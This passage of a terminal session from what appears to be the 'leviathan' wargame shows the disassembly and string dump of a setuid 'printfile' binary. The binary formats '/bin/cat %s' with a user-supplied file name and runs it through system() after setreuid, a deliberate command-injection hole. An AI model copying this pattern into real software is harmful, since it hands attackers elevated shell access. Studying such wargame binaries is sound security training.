 8048619:	8b 00                	mov    eax,DWORD PTR [eax]
 804861b:	89 44 24 0c          	mov    DWORD PTR [esp+0xc],eax
 804861f:	c7 44 24 08 44 87 04 	mov    DWORD PTR [esp+0x8],0x8048744
 8048626:	08
 8048627:	c7 44 24 04 ff 01 00 	mov    DWORD PTR [esp+0x4],0x1ff
 804862e:	00
 804862f:	8d 44 24 2c          	lea    eax,[esp+0x2c]
 8048633:	89 04 24             	mov    DWORD PTR [esp],eax
 8048636:	e8 25 fe ff ff       	call   8048460 <snprintf@plt>
 804863b:	e8 d0 fd ff ff       	call   8048410 <geteuid@plt>
 8048640:	89 c3                	mov    ebx,eax
 8048642:	e8 c9 fd ff ff       	call   8048410 <geteuid@plt>
 8048647:	89 5c 24 04          	mov    DWORD PTR [esp+0x4],ebx
 804864b:	89 04 24             	mov    DWORD PTR [esp],eax
 804864e:	e8 ed fd ff ff       	call   8048440 <setreuid@plt>
 8048653:	8d 44 24 2c          	lea    eax,[esp+0x2c]
 8048657:	89 04 24             	mov    DWORD PTR [esp],eax
 804865a:	e8 d1 fd ff ff       	call   8048430 <system@plt>
 804865f:	b8 00 00 00 00       	mov    eax,0x0
 8048664:	8b 94 24 2c 02 00 00 	mov    edx,DWORD PTR [esp+0x22c]
 804866b:	65 33 15 14 00 00 00 	xor    edx,DWORD PTR gs:0x14
 8048672:	74 05                	je     8048679 <main+0xec>
 8048674:	e8 87 fd ff ff       	call   8048400 <__stack_chk_fail@plt>
 8048679:	8b 5d fc             	mov    ebx,DWORD PTR [ebp-0x4]
 804867c:	c9                   	leave
 804867d:	c3                   	ret
 804867e:	66 90                	xchg   ax,ax

08048680 <__libc_csu_init>:
 8048680:	55                   	push   ebp
 8048681:	57                   	push   edi
 8048682:	56                   	push   esi
 8048683:	53                   	push   ebx
 8048684:	e8 37 fe ff ff       	call   80484c0 <__x86.get_pc_thunk.bx>
 8048689:	81 c3 77 19 00 00    	add    ebx,0x1977
 804868f:	83 ec 0c             	sub    esp,0xc
 8048692:	8b 6c 24 20          	mov    ebp,DWORD PTR [esp+0x20]
 8048696:	8d b3 0c ff ff ff    	lea    esi,[ebx-0xf4]
 804869c:	e8 13 fd ff ff       	call   80483b4 <_init>
 80486a1:	8d 83 08 ff ff ff    	lea    eax,[ebx-0xf8]
 80486a7:	29 c6                	sub    esi,eax
 80486a9:	c1 fe 02             	sar    esi,0x2
 80486ac:	85 f6                	test   esi,esi
 80486ae:	74 25                	je     80486d5 <__libc_csu_init+0x55>
 80486b0:	31 ff                	xor    edi,edi
 80486b2:	8d b6 00 00 00 00    	lea    esi,[esi+0x0]
 80486b8:	83 ec 04             	sub    esp,0x4
 80486bb:	ff 74 24 2c          	push   DWORD PTR [esp+0x2c]
 80486bf:	ff 74 24 2c          	push   DWORD PTR [esp+0x2c]
 80486c3:	55                   	push   ebp
 80486c4:	ff 94 bb 08 ff ff ff 	call   DWORD PTR [ebx+edi*4-0xf8]
 80486cb:	83 c7 01             	add    edi,0x1
 80486ce:	83 c4 10             	add    esp,0x10
 80486d1:	39 f7                	cmp    edi,esi
 80486d3:	75 e3                	jne    80486b8 <__libc_csu_init+0x38>
 80486d5:	83 c4 0c             	add    esp,0xc
 80486d8:	5b                   	pop    ebx
 80486d9:	5e                   	pop    esi
 80486da:	5f                   	pop    edi
 80486db:	5d                   	pop    ebp
 80486dc:	c3                   	ret
 80486dd:	8d 76 00             	lea    esi,[esi+0x0]

080486e0 <__libc_csu_fini>:
 80486e0:	f3 c3                	repz ret

Disassembly of section .fini:

080486e4 <_fini>:
 80486e4:	53                   	push   ebx
 80486e5:	83 ec 08             	sub    esp,0x8
 80486e8:	e8 d3 fd ff ff       	call   80484c0 <__x86.get_pc_thunk.bx>
 80486ed:	81 c3 13 19 00 00    	add    ebx,0x1913
 80486f3:	83 c4 08             	add    esp,0x8
 80486f6:	5b                   	pop    ebx
 80486f7:	c3                   	ret
leviathan2@leviathan:~$ xxd -s 0x700 -l 0x50 printfile
00000700: 2a2a 2a20 4669 6c65 2050 7269 6e74 6572  *** File Printer
00000710: 202a 2a2a 0055 7361 6765 3a20 2573 2066   ***.Usage: %s f
00000720: 696c 656e 616d 650a 0059 6f75 2063 616e  ilename..You can
00000730: 7420 6861 7665 2074 6861 7420 6669 6c65  t have that file
00000740: 2e2e 2e00 2f62 696e 2f63 6174 2025 7300  ..../bin/cat %s.
leviathan2@leviathan:~$